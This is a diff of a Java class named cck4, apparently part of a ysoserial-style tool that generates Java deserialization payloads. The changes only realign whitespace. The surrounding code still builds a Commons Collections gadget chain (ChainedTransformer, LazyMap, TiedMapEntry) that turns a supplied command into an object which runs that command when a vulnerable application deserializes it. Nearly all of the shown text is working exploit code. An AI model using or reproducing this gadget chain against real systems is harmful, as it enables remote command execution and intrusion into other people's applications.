@@ -18,13 +18,13 @@ import java.util.Map;
 public class cck4 implements ObjectPayload<Object> {
 
     public Object getObject(String command) throws Exception {
-        Transformer[]       fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
-        Transformer[] transformers     = (Transformer[]) TransformerUtil.makeTransformer(command);
-        Transformer         transformerChain = new ChainedTransformer(fakeTransformers);
-        Map                 innerMap         = new HashMap();
-        Map                 outerMap         = LazyMap.lazyMap(innerMap, transformerChain);
-        TiedMapEntry        tme              = new TiedMapEntry(outerMap, "QI4L");
-        Map                 expMap           = new HashMap();
+        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
+        Transformer[] transformers = (Transformer[]) TransformerUtil.makeTransformer(command);
+        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.lazyMap(innerMap, transformerChain);
+        TiedMapEntry tme = new TiedMapEntry(outerMap, "QI4L");
+        Map expMap = new HashMap();
         expMap.put(tme, "QI5L");
         outerMap.remove("QI4L");
 
